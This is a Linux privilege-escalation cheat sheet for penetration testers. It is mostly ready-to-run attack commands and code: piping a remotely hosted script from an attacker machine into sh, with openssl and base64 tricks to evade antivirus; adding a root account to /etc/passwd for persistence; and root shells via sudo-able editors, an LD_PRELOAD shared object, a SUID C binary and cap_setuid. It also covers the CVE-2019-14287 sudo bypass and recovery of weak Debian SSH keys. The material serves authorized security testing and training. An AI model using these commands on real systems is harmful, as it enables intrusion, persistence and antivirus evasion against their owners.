# Privilege Escalation

{% hint style="success" %}
Hack Responsibly.

Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents. You accept full responsibility for your actions by applying any knowledge gained here.
{% endhint %}

TODO: Add contents links at the top of each page, and references section at the bottom...Add code examples and perhaps screenshots for each example

## Tools

* [BeRoot - Privilege Escalation Project - Windows / Linux / Mac](https://github.com/AlessandroZ/BeRoot)
* [linuxprivchecker.py - a Linux Privilege Escalation Check Script](https://github.com/sleventyeleven/linuxprivchecker)
* [unix-privesc-check - Automatically exported from code.google.com/p/unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check)
* [Privilege Escalation through sudo - Linux](https://github.com/TH3xACE/SUDO_KILLER)

## `linpeas.sh`

#### Execute from github

```bash
curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
```

#### Execute from attacker's machine

```bash
sudo python -m SimpleHTTPServer 80
curl 10.10.10.10/linpeas.sh | sh
```

####  Execute from attacker's machine \(Without curl\)

```bash
sudo nc -q 5 -lvnp 80 < linpeas.sh
cat < /dev/tcp/10.10.10.10/80 | sh
```

####  Output to file

```bash
# -a to execute all the checks
linpeas -a > /dev/shm/linpeas.txt

#Read with colors
less -r /dev/shm/linpeas.txt
```

### AV bypass

#### Using open-ssl encryption

```bash
openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:AVBypassWithAES -in linpeas.sh -out lp.enc

#Start HTTP server
sudo python -m SimpleHTTPServer 80

#Download from the victim's machine
curl 10.10.10.10/lp.enc | openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:AVBypassWithAES | sh
```

#### Using a base64-encoded payload

```bash
#convert to base64
base64 -w0 linpeas.sh > lp.enc 

#Start HTTP server
sudo python -m SimpleHTTPServer 80

#Download from the victim, decode from base64, run in-memory
curl 10.10.10.10/lp.enc | base64 -d | sh
#or
wget -O - http://10.10.10.10/lp.enc | base64 -d | sh
```

## /etc/passwd

### Add Account & Password to /etc/passwd

* Generate password with `openssl passwd -1 -salt $username $password` 
* Add to `/etc/passwd` file which is in the format: 
  * `$UserName:$generated_password:$UID:$GUID:$comment:$home_dir:$default_shell` 
  * \(assumes you have write privilege to this file!\). 
* Can be used for persistence.

#### Create SHA512 password hash for import into passwd file:

```python
python -c "import crypt, getpass, pwd; \
             print(crypt.crypt('password', '\$6\$saltsalt\$'))"
             
-or-
python -c 'import crypt,getpass; \
             print(crypt.crypt(getpass.getpass(), crypt.mksalt(crypt.METHOD_SHA512)))'

-or-
python -c 'import crypt; \
             print(crypt.crypt("somesecret", crypt.mksalt(crypt.METHOD_SHA512)))'
```

#### Create SHA1 password hash: 

```bash
sha1pass $mypassword
```

## GTFOBins

[https://gtfobins.github.io/](https://gtfobins.github.io/)

> GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions. The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.

After finding binaries with SUID or other possible root permissions, you can search this site for privilege escalation methods.

You can also find a similar project for Windows at [LOLBAS](https://lolbas-project.github.io/).

#### Examples:

Privilege Escalation to Root with `find`: 

```bash
sudo find /etc -exec sh -i \;
```

Execute any command while in `less`: 

```bash
!$command
```

Escalate to root shell if your user can `sudo` any of these text editors:

```bash
#vi
1. [user@localhost]$ sudo vi
2. :shell
3. [root@localhost]#
#-or-
sudo vim -c '!sh'
#-or
sudo -u root vim -c '!sh'

#less
1. [user@localhost]$ sudo less file.txt
2. !bash
3. [root@localhost]#

#more
1. [user@localhost]$ sudo more long_file.txt
2. !bash
3. [root@localhost]#
#Note: for the 'more' method to work, the attacker has to read a file 
#that is longer than one terminal screen high
```

## Sudo

The `sudo` command allows non-root users to run commands that would normally require super user privileges.  Its configuration file is `/etc/sudoers` and lists user's permissions while using `sudo`. 

### NOPASSWD

A `sudo` configuration that allows a user to execute specified commands with another user privileges without knowing the password.

```bash
$ sudo -l

User zweilos may run the following commands on kali:
    (root) NOPASSWD: /usr/bin/vim
```

In this example the user `zweilos` can run `vim` as `root`. Any files can now be read or written to, for example adding an SSH key into the `/root/.ssh` directory. `vim` can also be used to gain a root shell or run programs with `!<command>`.

### LD\_PRELOAD

**LD\_PRELOAD** is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library, including the C runtime library \(libc.so\). This is called preloading a library.

1. Check if `LD_PRELOAD` is explicitly defined in the `/etc/sudoers` file:

```bash
#Check in /etc/sudoers for a line with env_keep += LD_PRELOAD
Defaults        env_keep += LD_PRELOAD

# or check with sudo -l
user@debian:~$ sudo -l 
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD
```

  2. Compile the following shared object using the C code below with `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```

  3. Execute any binary along with the LD\_PRELOAD shared object to spawn a shell : `sudo LD_PRELOAD=</path/to/malicious/shell.so> <program>`

### sudo\_inject

Using [https://github.com/nongiach/sudo\_inject](https://github.com/nongiach/sudo_inject):

```bash
$ sudo $command
[sudo] password for user:    
# Press Ctrl+c since you don't have the password, which creates an invalid sudo token
$ sh exploit.sh
.... wait 1 seconds
$ sudo -i # no password required :)
# id
uid=0(root) gid=0(root) groups=0(root)
```

You can find presentation slides about this tool at: [https://github.com/nongiach/sudo\_inject/blob/master/slides\_breizh\_2019.pdf](https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf)

### sudo version &lt; 1.8.28 \(CVE-2019-14287\)

An issue in `sudo` \(version 1.8.28 and earlier\), which occurs when an entry is inserted into the sudoers file with permissions = \(ALL, !root\):

```text
zweilos kali = (ALL, !root) /usr/bin/chmod
```

This entry normally would mean that user `zweilos` is allowed to run `chmod` as any user except the root user, however, an error in these versions of `sudo` allows an attacker to run the specified programs in the `/etc/sodoers` file as root by telling `sudo` to act as user ID number `-1` \(or its unsigned number `4294967295`\),which is then interpreted as user ID `0` or `root`.  

```text
sudo -u#-1 id
0
sudo -u#4294967295 id
0
```

## doas \(OpenBSD\)

There are some alternatives to `sudo` such as `doas` for OpenBSD. You can check its configuration in `/etc/doas.conf`.  This configuration has a different syntax than `/etc/sudoers`. 

```bash
#this is the same as the /etc/sudoers example with NOPASSWD
permit nopass zweilos as root cmd vim
```

## SSH

### SSH Predictable PRNG \(Authorized\_Keys\) Key Recovery Process

This module describes how to attempt to use an obtained `authorized_keys` file on a host system to login to a remote host by using a SSH-DSS string.

**Steps**

1. Get the `authorized_keys` file from the victim's system.  An example of this file would look like:

```text
ssh-dss AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf ... (snipped) ...
```

  2. Since this is an `ssh-dss` key, we need to add that to our local copy of `/etc/ssh/ssh_config` and `/etc/ssh/sshd_config`:

```text
echo "PubkeyAcceptedKeyTypes=+ssh-dss" >> /etc/ssh/ssh_config
echo "PubkeyAcceptedKeyTypes=+ssh-dss" >> /etc/ssh/sshs_config
/etc/init.d/ssh restart
```

  3. Get [g0tmi1k's debian-ssh repository](https://github.com/g0tmi1k/debian-ssh) and unpack the keys:

```text
git clone https://github.com/g0tmi1k/debian-ssh
cd debian-ssh
tar vjxf common_keys/debian_ssh_dsa_1024_x86.tar.bz2
```

  4. Grab the first 20 or 30 bytes from the key file shown above starting with `"AAAA..."` and search the unpacked keys with `grep`:

```text
grep -lr 'AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf'
dsa/1024/68b329da9893e34099c7d8ad5cb9c940-17934.pub
```

  5. If successful, this will return a public key file \(68b329da9893e34099c7d8ad5cb9c940-17934.pub\). To use this as a private key file to connect to the victim, drop the '.pub' extension and do:

```text
ssh -vvv victim@target -i 68b329da9893e34099c7d8ad5cb9c940-17934
```

After this you should be able to connect without requiring a password. If stuck, the details from `-vvv` \(verbose mode\) should provide enough details as to why.

## SUID Permissions

SUID \(or setuid\) stands for "Set user ID upon execution". If a file with this permission is ran, the user's ID will effectively be set to the file owner's \(for that program only\). For example, if a file with SUID permissions is owned by `root`, during the execution of that program the user ID will be changed to `root` even if it was executed from the unprivileged user `bob`. The SUID bit is represented by an `s` in the file permissions.

### Find SUID binaries

```bash
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
find / -uid 0 -perm -4000 -type f 2>/dev/null
```

### Create a SUID binary

```bash
print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.c   
gcc -o /tmp/suid /tmp/suid.c  
sudo chmod +x /tmp/suid # add execute permission
sudo chmod +s /tmp/suid # add suid permission

#Executing this program will give the user a root shell.  
#Note that sudo rights are required to accomplish this.
```

## File Capabilities

What are Linux capabilities?

BLUF: Capabilities break up root privileges in smaller units, so root access is no longer needed. Most of the binaries that have SUID permissions can be changed to use capabilities instead, which in turn increases security.

TODO: rewrite this for clarity and brevity

> Normally the root user \(or any ID with UID of 0\) gets a special treatment when running processes. The kernel and applications are usually programmed to skip the restriction of some activities when seeing this user ID. In other words, this user is allowed to do \(almost\) anything. Linux capabilities provide a subset of the available root privileges to a process. This effectively breaks up root privileges into smaller and distinctive units. Each of these units can then be independently be granted to processes. This way the full set of privileges is reduced and decreasing the risks of exploitation. 
>
> Why capabilities? To better understand how Linux capabilities work, let’s have a look first at the problem it tries to solve. Let’s assume we are running a process as a normal user. This means we are non-privileged. We can only access data that owned by us, our group, or which is marked for access by all users. At some point in time, our process needs a little bit more permissions to fulfill its duties, like opening a network socket. The problem is that normal users can not open a socket, as this requires root permissions. 
>
> Option 1: Giving everyone root permissions One of the solutions is to allow some permissions \(by default\) to all users. There is a serious flaw in this approach. Allowing this kind of permissions, for all users, would open up the system for a flood of system abuse. The reason is that every small opportunity is being used for good, but also for bad. Giving away too many privileges by default will result in unauthorized changes of data, backdoors and circumventing access controls, just to name a few. 
>
> Option 2: Using a fine-grained set of privileges For example, a web server normally runs at port 80. To start listening on one of the lower ports \(&lt;1024\), you need root permissions. This web server daemon needs to be able to listen to port 80. However, it does not need access to kernel modules as that would be a serious threat to the integrity of the system!. Instead of giving this daemon all root permissions, we can set a capability on the related binary, like CAP\_NET\_BIND\_SERVICE. With this specific capability, it can open up port 80. Much better! 
>
> Replacing setuid with capabilities Assigning the setuid bit to binaries is a common way to give programs root permissions. Linux capabilities is a great alternative to reduce the usage of setuid.

| Capabilities name | Description |
| :--- | :--- |
| **CAP\_AUDIT\_CONTROL** | Allow to enable/disable kernel auditing |
| **CAP\_AUDIT\_WRITE** | Helps to write records to kernel auditing log |
| **CAP\_BLOCK\_SUSPEND** | This feature can block system suspends |
| **CAP\_CHOWN** | Allow user to make arbitrary change to files UIDs and GIDs |
| **CAP\_DAC\_OVERRIDE** | This helps to bypass file read, write and execute permission checks |
| **CAP\_DAC\_READ\_SEARCH** | This only bypass file and directory read/execute permission checks |
| **CAP\_FOWNER** | This enables to bypass permission checks on operations that normally require the filesystem UID of the process to match the UID of the file |
| **CAP\_KILL** | Allow the sending of signals to processes belonging to others |
| **CAP\_SETGID** | Allow changing of the GID |
| **CAP\_SETUID** | Allow changing of the UID |
| **CAP\_SETPCAP** | Helps to transferring and removal of current set to any PID |
| **CAP\_IPC\_LOCK** | This helps to lock memory |
| **CAP\_MAC\_ADMIN** | Allow MAC configuration or state changes |
| **CAP\_NET\_RAW** | Use RAW and PACKET sockets |
| **CAP\_NET\_BIND\_SERVICE** | SERVICE Bind a socket to internet domain privileged ports |

### List capabilities of files

```bash
#Recursively list capabilities of files in a folder:
getcap -r  /usr/bin
...
/usr/bin/fping                = cap_net_raw+ep
/usr/bin/dumpcap              = cap_dac_override,cap_net_admin,cap_net_raw+eip
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/rlogin               = cap_net_bind_service+ep
/usr/bin/ping                 = cap_net_raw+ep
/usr/bin/rsh                  = cap_net_bind_service+ep
/usr/bin/rcp                  = cap_net_bind_service+ep
...
```

### Editing file capabilities

```bash
/usr/bin/setcap -r /bin/ping            # remove all capabilities
/usr/bin/setcap cap_net_raw+p /bin/ping # add specific capabilities
```

### Privilege escalation using file capabilities

The capability `=ep` means the binary has all capabilities.

```bash
$ getcap openssl /usr/bin/openssl 
openssl=ep
```

The following capabilities can also be used in order to upgrade your current privileges:

Read any file: `cap_dac_read_search` 

SUID: `cap_setuid+ep`

Example of privilege escalation with `cap_setuid+ep`

```bash
sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7
python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
id
#uid=0(root) gid=1000(zweilos)
```

## Misc

list user's sudo permissions: `sudo -l`

wildcard injection: \[NEED MORE HERE\]

```bash
mawk 'BEGIN {system("/bin/sh")}'
```

## References

* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Linux - Privilege Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md) - @swisskyrepo
* [https://unix.stackexchange.com/questions/52108/how-to-create-sha512-password-hashes-on-command-line](https://unix.stackexchange.com/questions/52108/how-to-create-sha512-password-hashes-on-command-line)
* [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
* [https://resources.whitesourcesoftware.com/blog-whitesource/new-vulnerability-in-sudo-cve-2019-14287](https://resources.whitesourcesoftware.com/blog-whitesource/new-vulnerability-in-sudo-cve-2019-14287)
* [https://gtfobins.github.io/](https://gtfobins.github.io/)
* [https://payatu.com/guide-linux-privilege-escalation](https://payatu.com/guide-linux-privilege-escalation)
* [https://touhidshaikh.com/blog/2018/04/sudo-ld\_preload-linux-privilege-escalation/](https://touhidshaikh.com/blog/2018/04/sudo-ld_preload-linux-privilege-escalation/)
* [https://www.baeldung.com/linux/ld\_preload-trick-what-is](https://www.baeldung.com/linux/ld_preload-trick-what-is)

If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!

